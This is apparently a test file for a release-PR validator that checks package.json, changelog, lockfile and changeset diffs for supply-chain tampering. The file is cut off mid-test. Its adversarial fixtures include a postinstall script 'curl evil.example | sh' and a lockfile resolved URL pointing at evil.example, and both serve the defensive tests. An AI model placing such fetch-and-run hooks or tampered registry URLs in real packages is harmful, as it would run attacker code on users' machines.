import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { applyReleaseChangesets } from "../apply-release-changesets.mjs";
import {
  evaluateReleasePrFootprint,
  isChangelogPureNewSection,
  isChangesetDeletionLegitimate,
  isLockfilePureVersionBump,
  isPackageManifestVersionOnlyChange,
} from "./release-pr-footprint.mjs";
import { changelogPathForPackageDir } from "./changelog-location.mjs";

// Seeds a fixture package changelog at docs/changelogs/<dir>.md (outside the
// package, scripts/lib/changelog-location.mjs), creating the directory.
function seedChangelog(pkgDir, text) {
  const path = changelogPathForPackageDir(pkgDir);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, text);
}

// ---------------------------------------------------------------- isPackageManifestVersionOnlyChange

test("isPackageManifestVersionOnlyChange: a pure version bump passes", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", license: "MIT", dependencies: { foo: "^1.0.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
});

// ADVERSARIAL (fix 2): key order matters -- a reordered exports block must fail
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a reordered exports block fails, even with identical key SET and values", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", exports: { import: "./esm.js", require: "./cjs.js" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", exports: { require: "./cjs.js", import: "./esm.js" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("isPackageManifestVersionOnlyChange: reordering TOP-LEVEL keys (e.g. dependencies before/after version) still passes -- only nested order within a field like exports is resolution-significant, and top-level key order changes with any JSON.stringify of a differently-key-ordered object either way", () => {
  // NOTE: top-level order differences are still caught structurally by JSON.stringify
  // (since the rest-object's own serialization reflects its own key order) -- this test
  // documents that a genuinely different top-level order is treated as a real difference,
  // consistent with "key order matters" applying uniformly, not selectively to `exports`.
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ dependencies: { foo: "^1.0.0" }, version: "1.0.1", name: "@x/alpha" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a dependency added alongside the version bump fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", dependencies: { foo: "^1.0.0", evil: "^9.9.9" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a postinstall script added alongside the version bump fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", scripts: { postinstall: "curl evil.example | sh" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("isPackageManifestVersionOnlyChange: malformed JSON on either side fails rather than throwing", () => {
  assert.equal(isPackageManifestVersionOnlyChange("not json", '{"version":"1.0.1"}'), false);
  assert.equal(isPackageManifestVersionOnlyChange('{"version":"1.0.0"}', "not json"), false);
});

test("isPackageManifestVersionOnlyChange: no version change at all fails even with identical rest", () => {
  const text = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  assert.equal(isPackageManifestVersionOnlyChange(text, text), false);
});

// ---------------------------------------------------------------- isPackageManifestVersionOnlyChange, THE WIDENED RULE (issue #1332, PR #1338)
//
// A release PR may ALSO rewrite a sibling dependency's range to
// `^<newVersion>`, in the SAME package.json as that sibling's own patch
// bump, when `bumpedVersionsByName` proves the named package was bumped to
// exactly that version by this same diff.

const CONSUMER_BASE = JSON.stringify({ name: "@x/consumer", version: "1.0.0", license: "MIT", dependencies: { "@x/core": "^0.9.0" } });

function consumerHeadWithRange(range, extra = {}) {
  return JSON.stringify({ name: "@x/consumer", version: "1.0.1", license: "MIT", dependencies: { "@x/core": range, ...extra } });
}

test("isPackageManifestVersionOnlyChange: a sibling range rewritten to exactly ^<the proven new version> passes", () => {
  const bumped = { "@x/core": "0.10.0" };
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange("^0.10.0"), bumped), true);
});

test("isPackageManifestVersionOnlyChange: the same rewrite in peerDependencies or optionalDependencies is allowed too, not only dependencies", () => {
  const bumped = { "@x/core": "0.10.0" };
  const base = JSON.stringify({ name: "@x/consumer", version: "1.0.0", peerDependencies: { "@x/core": "^0.9.0" } });
  const head = JSON.stringify({ name: "@x/consumer", version: "1.0.1", peerDependencies: { "@x/core": "^0.10.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head, bumped), true);

  const baseOpt = JSON.stringify({ name: "@x/consumer", version: "1.0.0", optionalDependencies: { "@x/core": "^0.9.0" } });
  const headOpt = JSON.stringify({ name: "@x/consumer", version: "1.0.1", optionalDependencies: { "@x/core": "^0.10.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(baseOpt, headOpt, bumped), true);
});

test("isPackageManifestVersionOnlyChange: with no bumpedVersionsByName argument at all, a range rewrite is refused exactly as before (unwidened default)", () => {
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange("^0.10.0")), false);
});

// ADVERSARIAL (widened rule): a range pointed at a non-bumped package
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a range rewritten for a package this diff never proved was bumped fails", () => {
  const bumped = { "@x/something-else": "9.9.9" }; // @x/core is not in the bumped set at all
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange("^0.10.0"), bumped), false);
});

// ADVERSARIAL (widened rule): a range rewritten to a different version than the one actually bumped
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a range rewritten to the WRONG version fails, even though @x/core really was bumped", () => {
  const bumped = { "@x/core": "0.10.0" };
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange("^0.99.0"), bumped), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a range rewritten to a range shape other than a bare caret (e.g. still a caret but with extra text, or a tilde) fails", () => {
  const bumped = { "@x/core": "0.10.0" };
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange("~0.10.0"), bumped), false);
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange(">=0.10.0"), bumped), false);
});

// ADVERSARIAL (widened rule): an added dependency
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a brand-new dependency entry added alongside a legitimate rewrite fails", () => {
  const bumped = { "@x/core": "0.10.0", "@x/evil": "1.0.0" };
  assert.equal(isPackageManifestVersionOnlyChange(CONSUMER_BASE, consumerHeadWithRange("^0.10.0", { "@x/evil": "^1.0.0" }), bumped), false);
});

// devDependencies now gets the identical exception too (decision + fix,
// re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726
// item 3) -- for a package that IS bumped for its own reason, a
// devDependencies rewrite to exactly ^<the proven new version> is allowed
// the same way dependencies/peerDependencies/optionalDependencies already are.
test("isPackageManifestVersionOnlyChange: the identical rewrite in devDependencies, alongside the package's OWN version bump, now passes too", () => {
  const bumped = { "@x/core": "0.10.0" };
  const base = JSON.stringify({ name: "@x/consumer", version: "1.0.0", devDependencies: { "@x/core": "^0.9.0" } });
  const head = JSON.stringify({ name: "@x/consumer", version: "1.0.1", devDependencies: { "@x/core": "^0.10.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head, bumped), true);
});

// ADVERSARIAL: the SAME devDependencies rewrite is still refused when
// nothing proves @x/core was really bumped -- devDependencies is subject
// to the identical isAllowedDependencyRangeChange() rule, not unconditionally allowed.
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a devDependencies rewrite for a package this diff never proved was bumped still fails", () => {
  const base = JSON.stringify({ name: "@x/consumer", version: "1.0.0", devDependencies: { "@x/core": "^0.9.0" } });
  const head = JSON.stringify({ name: "@x/consumer", version: "1.0.1", devDependencies: { "@x/core": "^0.10.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false); // no bumpedVersionsByName argument at all
});

// ADVERSARIAL (widened rule): a removed dependency
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a dependency entry removed entirely (even one naming a bumped package) fails", () => {
  const bumped = { "@x/core": "0.10.0" };
  const base = JSON.stringify({ name: "@x/consumer", version: "1.0.0", dependencies: { "@x/core": "^0.9.0", "@x/other": "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/consumer", version: "1.0.1", dependencies: { "@x/core": "^0.10.0" } }); // "@x/other" is gone
  assert.equal(isPackageManifestVersionOnlyChange(base, head, bumped), false);
});

// ADVERSARIAL (widened rule): a reordered dependency map
test("ADVERSARIAL isPackageManifestVersionOnlyChange: the SAME entries, SAME values, but reordered within the dependencies map fails", () => {
  const bumped = { "@x/core": "0.10.0" };
  const base = JSON.stringify({ name: "@x/consumer", version: "1.0.0", dependencies: { "@x/core": "^0.10.0", "@x/other": "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/consumer", version: "1.0.1", dependencies: { "@x/other": "^1.0.0", "@x/core": "^0.10.0" } }); // same two entries, swapped order, and @x/core already matches -- still a reorder
  assert.equal(isPackageManifestVersionOnlyChange(base, head, bumped), false);
});

test("isPackageManifestVersionOnlyChange: a legitimate rewrite alongside an untouched sibling entry in the SAME map passes", () => {
  const bumped = { "@x/core": "0.10.0" };
  const base = JSON.stringify({ name: "@x/consumer", version: "1.0.0", dependencies: { "@x/core": "^0.9.0", "@x/other": "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/consumer", version: "1.0.1", dependencies: { "@x/core": "^0.10.0", "@x/other": "^1.0.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head, bumped), true);
});

// ---------------------------------------------------------------- isChangelogPureNewSection

test("isChangelogPureNewSection: a clean single new section at the top, matching the expected version, passes", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

test("isChangelogPureNewSection: a brand-new file (no base) passes when it opens with the expected version heading, after the title line", () => {
  const head = "# Changelog\n\n## 0.1.0 - 2026-09-22\n\n- First release.\n";
  assert.equal(isChangelogPureNewSection(null, head, "0.1.0"), true);
});

// A CHANGELOG with a title but no version headings yet is the SAME "no
// heading" case as a brand-new file, not a split-point mismatch (fix,
// re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726
// item 5). Every one of these matches what scripts/apply-release-
// changesets.mjs's own prependChangelogEntry() actually produces for the
// SAME base -- these are producer OUTPUT shapes, not hand-picked to pass.
test("isChangelogPureNewSection: a title-only base with no releases yet, ending in a single newline, passes with the producer's real output", () => {
  const base = "# Changelog\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix a bug.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

test("isChangelogPureNewSection: a title-only base with NO trailing newline at all passes with the producer's real output", () => {
  const base = "# Changelog";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix a bug.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

test("isChangelogPureNewSection: a title-only base with EXTRA trailing blank lines passes with the producer's real output", () => {
  const base = "# Changelog\n\n\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-24\n\n- Fix a bug.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

// ADVERSARIAL: the title-only, no-heading case must stay exactly as
// strict as the with-heading case about everything BUT trailing
// whitespace -- a rewritten title, or a duplicate heading, still fails.
test("ADVERSARIAL isChangelogPureNewSection: a title-only base whose title line itself was rewritten (not just trailing whitespace) still fails", () => {
  const base = "# Changelog\n";
  const head = "# Change Log\n\n## 1.0.1 - 2026-09-24\n\n- Fix a bug.\n"; // title text itself altered
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

test("ADVERSARIAL isChangelogPureNewSection: a title-only base with the wrong version heading still fails", () => {
  const base = "# Changelog\n";
  const head = "# Changelog\n\n## 9.9.9 - 2026-09-24\n\n- Fix a bug.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

test("isChangelogPureNewSection: no growth at all fails", () => {
  const text = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(text, text, "1.0.0"), false);
});

// ADVERSARIAL (fix 3): a section spliced mid-entry
test("ADVERSARIAL isChangelogPureNewSection: a section spliced into the MIDDLE of an existing entry (not at the top) fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n- Second bullet.\n";
  // Inserted between the two existing bullets, not before the "## 1.0.0" heading.
  const head = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n\n## 1.0.1\n\n- Fixed a bug.\n\n- Second bullet.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

// ADVERSARIAL (fix 3): a section appended at the end
test("ADVERSARIAL isChangelogPureNewSection: a section appended at the END fails -- the insertion point must be the top", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = base + "\n## 1.0.1\n\n- Also fine structurally, but in the wrong place.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

// ADVERSARIAL (fix 3): the wrong version in the heading
test("ADVERSARIAL isChangelogPureNewSection: a cleanly-inserted section with the WRONG version in its heading fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 9.9.9 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false); // package.json actually bumped to 1.0.1, not 9.9.9
});

// ADVERSARIAL (fix 3): a fake duplicate heading that shadows the real one
test("ADVERSARIAL isChangelogPureNewSection: a second heading smuggled inside the same inserted block fails, even though the block is still a single contiguous insertion", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  // The insertion contains TWO headings: the legitimate "## 1.0.1" and a duplicate/shadow "## 1.0.0".
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- A shadow entry, not the real one below.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

// REGRESSION (found by re-review, https://github.com/clossys/foundry/pull/1316#issuecomment-5801060575):
// the duplicate-heading defense-in-depth check must count only "## "
// (exactly two hashes) VERSION headings, never "### " (three hashes)
// Keep-a-Changelog SUBSECTION headings like "### Added" / "### Fixed" --
// those are legitimately repeated in every entry of a real changelog, so
// counting them as "duplicate headings" refused every genuine release PR.
test("REGRESSION isChangelogPureNewSection: repeated '### Added' / '### Fixed' Keep-a-Changelog subsections across entries are NOT duplicate version headings", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n### Added\n\n- Initial feature.\n\n### Fixed\n\n- An early bug.\n";
  const head = "# Changelog\n\n## 1.0.1\n\n### Fixed\n\n- A new bug.\n\n## 1.0.0\n\n### Added\n\n- Initial feature.\n\n### Fixed\n\n- An early bug.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

test("ADVERSARIAL isChangelogPureNewSection: rewriting an OLD entry alongside a legitimate new one fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Rewritten history, not the original bullet.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

test("isChangelogPureNewSection: text before the version number that looks similar (e.g. 1.0.10 vs 1.0.1) does not false-match", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.10 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false); // heading is 1.0.10, expected 1.0.1
  assert.equal(isChangelogPureNewSection(base, head, "1.0.10"), true);
});

// ---------------------------------------------------------------- isLockfilePureVersionBump

const LOCK_BASE = JSON.stringify({
  name: "foundry",
  lockfileVersion: 3,
  requires: true,
  packages: {
    "": { name: "foundry", version: "0.0.0" },
    "packages/alpha": { name: "@clossys/alpha", version: "1.0.0", license: "MIT" },
    "node_modules/@clossys/alpha": { resolved: "packages/alpha", link: true },
    "node_modules/foo": { version: "2.0.0", resolved: "https://registry.npmjs.org/foo/-/foo-2.0.0.tgz", integrity: "sha512-real" },
  },
});

function lockWithAlphaBumped(version) {
  const parsed = JSON.parse(LOCK_BASE);
  parsed.packages["packages/alpha"].version = version;
  return JSON.stringify(parsed);
}

// The manifest cross-check data (re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726)
// matching a legitimate "@clossys/alpha" 1.0.0 -> 1.0.1 bump with no
// dependency fields of its own (LOCK_BASE's own "packages/alpha" entry
// carries none) -- reused across every test below so each one keeps
// isolating the SPECIFIC defect it names, rather than incidentally also
// tripping the (independent) lockfile-vs-manifest cross-check.
const ALPHA_BUMPED_MANIFEST = { "@clossys/alpha": { version: "1.0.1" } };

test("isLockfilePureVersionBump: an UNCHANGED tree (head identical to base), with nothing claimed bumped, passes", () => {
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, LOCK_BASE, []), true);
});

test("isLockfilePureVersionBump: a legitimate bump (only the bumped workspace package's version changes) passes", () => {
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, lockWithAlphaBumped("1.0.1"), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), true);
});

test("isLockfilePureVersionBump: a legitimate bump where the matching node_modules link entry ALSO records a version passes", () => {
  const base = JSON.parse(LOCK_BASE);
  base.packages["node_modules/@clossys/alpha"].version = "1.0.0";
  const head = JSON.parse(LOCK_BASE);
  head.packages["packages/alpha"].version = "1.0.1";
  head.packages["node_modules/@clossys/alpha"].version = "1.0.1";
  head.packages["node_modules/@clossys/alpha"].resolved = "packages/alpha";
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), true);
});

// ADVERSARIAL (should-fix, re-review https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726
// and https://github.com/clossys/foundry/pull/1353#issuecomment-5803894960):
// a link entry's OWN `version` field, if it has one, must match the REAL
// workspace entry it `resolved` points at -- never an arbitrary,
// unconstrained value.
test("ADVERSARIAL isLockfilePureVersionBump: a node_modules link entry that gains an ARBITRARY version unrelated to the real bump fails", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(LOCK_BASE);
  head.packages["packages/alpha"].version = "1.0.1"; // the real bump
  head.packages["node_modules/@clossys/alpha"].version = "9.9.9"; // unrelated, arbitrary
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

// ADVERSARIAL (fix 1): a resolved/integrity tamper
test("ADVERSARIAL isLockfilePureVersionBump: a tampered resolved/integrity field on a THIRD-PARTY dependency fails, even with a legitimate bump elsewhere", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["node_modules/foo"].resolved = "https://evil.example/foo.tgz";
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a tampered resolved/integrity field on the BUMPED workspace entry itself also fails (only version may change there)", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["packages/alpha"].license = "GPL-3.0"; // not a version change, and not even a real resolved/integrity field on a workspace entry -- any non-version field changing is the point
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

// ADVERSARIAL (fix 1): an added dependency
test("ADVERSARIAL isLockfilePureVersionBump: an added dependency (a whole new packages-map entry) fails", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["node_modules/evil"] = { version: "9.9.9", resolved: "https://registry.npmjs.org/evil/-/evil-9.9.9.tgz", integrity: "sha512-evil" };
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

// ADVERSARIAL (fix 1): a version change on a non-bumped package
test("ADVERSARIAL isLockfilePureVersionBump: a version change on a package NOT in the bumped set fails", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["node_modules/foo"].version = "3.0.0"; // foo was never bumped by this PR's package.json changes
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

// ---------------------------------------------------------------- isLockfilePureVersionBump: THE LOCKFILE MUST MIRROR THE MANIFEST (re-review, blocking item 2)
//
// https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726 --
// every case above proved the lockfile diff LOOKS like an allowed shape
// relative to ITSELF; none of them proved it matches the real manifest
// this diff actually bumped. These four are the reviewer's own four tamper
// cases, each starting from a legitimate lockfile bump/rewrite and
// diverging ONLY from the manifest, never from internal lockfile shape.

test("ADVERSARIAL isLockfilePureVersionBump: a lockfile version that does not match the manifest's real new version fails, even though it is still a plain version change", () => {
  const head = lockWithAlphaBumped("9.9.9"); // manifest really bumped to 1.0.1, not 9.9.9
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, head, ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a bumped workspace entry with its version field deleted entirely fails", () => {
  const head = JSON.parse(LOCK_BASE);
  delete head.packages["packages/alpha"].version;
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, JSON.stringify(head), ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a bumped workspace entry left at its BASE version (never actually bumped in the lockfile) fails", () => {
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, LOCK_BASE, ["alpha"], {}, ALPHA_BUMPED_MANIFEST), false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a dependent range in the lockfile that disagrees with the manifest's own range fails, in either direction", () => {
  const base = realLockfileFixtureFor2({ dependencies: { "@x/core": "^0.9.0" } });
  const headLockfileStale = realLockfileFixtureFor2({ version: "1.0.1", dependencies: { "@x/core": "^0.9.0" } }); // lockfile keeps the stale range
  const manifestRewritten = { "@x/consumer": { version: "1.0.1", dependencies: { "@x/core": "^0.10.0" } } }; // manifest rewrote it
  assert.equal(isLockfilePureVersionBump(base, headLockfileStale, ["consumer"], { "@x/core": "0.10.0" }, manifestRewritten), false);

  const headLockfileRewritten = realLockfileFixtureFor2({ version: "1.0.1", dependencies: { "@x/core": "^0.10.0" } }); // lockfile rewrites it
  const manifestStale = { "@x/consumer": { version: "1.0.1", dependencies: { "@x/core": "^0.9.0" } } }; // manifest kept the stale range (reverse mismatch)
  assert.equal(isLockfilePureVersionBump(base, headLockfileRewritten, ["consumer"], { "@x/core": "0.10.0" }, manifestStale), false);
});

// Minimal single-workspace-entry lockfile fixture for the dependent-range
// mismatch test above -- deliberately NOT LOCK_BASE/realLockfileFixture
// (those model "@clossys/alpha" and "@clossys/publisher"), so this reads
// as a self-contained "consumer" scenario matching the manifest names used
// in the assertions right above it.
function realLockfileFixtureFor2(consumerEntryOverrides) {
  return (
    JSON.stringify(
      {
        name: "fixture-root",
        lockfileVersion: 3,
        requires: true,
        packages: {
          "": { name: "fixture-root", workspaces: ["packages/*"] },
          "packages/consumer": { name: "@x/consumer", version: "1.0.0", license: "MIT", ...consumerEntryOverrides },
        },
      },
      null,
      2,
    ) + "\n"
  );
}

test("isLockfilePureVersionBump: malformed JSON, or a missing packages map, fails rather than throwing", () => {
  assert.equal(isLockfilePureVersionBump("not json", LOCK_BASE, ["alpha"]), false);
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, "not json", ["alpha"]), false);
  assert.equal(isLockfilePureVersionBump(JSON.stringify({ name: "foundry" }), LOCK_BASE, ["alpha"]), false);
});

// ---------------------------------------------------------------- isLockfilePureVersionBump: devDependencies-only entries cross-checked too
//
// Re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726
// should-fix, closed here: a package whose ONLY change is a
// devDependencies rewrite (never bumped -- see isDevDependenciesOnlyRewrite()'s
// own header) previously had its lockfile entry proven only internally
// consistent, never cross-checked against the real manifest -- a lockfile
// left at the stale range while the manifest was correctly rewritten (or
// the reverse) both passed.

function controllerLockfileFixture(controllerEntryOverrides) {
  return (
    JSON.stringify(
      {
        name: "fixture-root",
        lockfileVersion: 3,
        requires: true,
        packages: {
          "": { name: "fixture-root", workspaces: ["packages/*"] },
          "packages/controller": { name: "@x/controller", version: "1.0.0", license: "MIT", devDependencies: { "@x/core": "^0.9.0" }, ...controllerEntryOverrides },
        },
      },
      null,
      2,
    ) + "\n"
  );
}

test("isLockfilePureVersionBump: a devDependencies-only entry's lockfile rewrite matching the real manifest passes", () => {
  const base = controllerLockfileFixture({});
  const head = controllerLockfileFixture({ devDependencies: { "@x/core": "^0.10.0" } });
  const result = isLockfilePureVersionBump(base, head, [], { "@x/core": "0.10.0" }, {}, ["controller"], { "@x/controller": { version: "1.0.0", devDependencies: { "@x/core": "^0.10.0" } } });
  assert.equal(result, true);
});

test("ADVERSARIAL isLockfilePureVersionBump: a devDependencies-only entry's lockfile left at the STALE range while the manifest was correctly rewritten fails", () => {
  const base = controllerLockfileFixture({});
  const head = controllerLockfileFixture({}); // lockfile devDependencies never actually rewritten
  const result = isLockfilePureVersionBump(base, head, [], { "@x/core": "0.10.0" }, {}, ["controller"], { "@x/controller": { version: "1.0.0", devDependencies: { "@x/core": "^0.10.0" } } });
  assert.equal(result, false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a devDependencies-only entry's lockfile rewritten while the manifest was left stale (the reverse mismatch) fails", () => {
  const base = controllerLockfileFixture({});
  const head = controllerLockfileFixture({ devDependencies: { "@x/core": "^0.10.0" } });
  // manifest info still claims the OLD range -- the two disagree.
  const result = isLockfilePureVersionBump(base, head, [], { "@x/core": "0.10.0" }, {}, ["controller"], { "@x/controller": { version: "1.0.0", devDependencies: { "@x/core": "^0.9.0" } } });
  assert.equal(result, false);
});

// ---------------------------------------------------------------- isChangesetDeletionLegitimate
//
// isChangesetDeletionLegitimate() itself is back to a plain membership
// check (re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803854341):
// "was this changeset actually consumed, not just does its package
// happen to be bumped" is now proven by evaluateReleasePrFootprint()'s
// byte-for-byte CHANGELOG reconstruction (reconstructExpectedChangelogText(),
// tested in the evaluateReleasePrFootprint section below), not by this
// function -- a substring-based version of that proof lived here for one
// round and was found spoofable.

test("isChangesetDeletionLegitimate: a changeset naming only bumped packages is legitimate", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\n---\n\nFix a bug.\n", ["alpha"]), true);
});

test("isChangesetDeletionLegitimate: a changeset naming several packages, ALL bumped, is legitimate", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\nbeta: minor\n---\n\nShared fix.\n", ["alpha", "beta"]), true);
});

// ADVERSARIAL (fix 4): deleting an unrelated pending changeset
test("ADVERSARIAL isChangesetDeletionLegitimate: a changeset naming a package NOT bumped by this diff is not legitimate", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nbeta: minor\n---\n\nAn unrelated pending change.\n", ["alpha"]), false);
});

test("ADVERSARIAL isChangesetDeletionLegitimate: a changeset naming BOTH a bumped and an unrelated package is not legitimate (partial consumption is not consumption)", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\nbeta: minor\n---\n\nMixed.\n", ["alpha"]), false);
});

test("isChangesetDeletionLegitimate: a malformed changeset fails rather than throwing", () => {
  assert.equal(isChangesetDeletionLegitimate("not a changeset at all", ["alpha"]), false);
  assert.equal(isChangesetDeletionLegitimate(null, ["alpha"]), false);
});

// ---------------------------------------------------------------- evaluateReleasePrFootprint

function manifestPair(version1, version2, extra = {}) {
  return [JSON.stringify({ name: "@x/alpha", version: version1, ...extra }), JSON.stringify({ name: "@x/alpha", version: version2, ...extra })];
}

test("evaluateReleasePrFootprint: a clean release PR (bump + changelog + lockfile + a legitimately-consumed changeset) passes", () => {
  // name must match LOCK_BASE's "packages/alpha" entry ("@clossys/alpha")
  // now that the lockfile check cross-references the real manifest by name
  // (re-review, https://github.com/clossys/foundry/pull/1353#issuecomment-5803457726).
  const [base, head] = manifestPair("1.0.0", "1.0.1", { name: "@clossys/alpha" });
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      {
        path: "docs/changelogs/alpha.md",
        status: "modified",
        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
        // The new heading must carry a " - <date>" suffix and the exact
        // bullet the deleted changeset's own summary produces --
        // reconstructExpectedChangelogText() now rebuilds this byte for
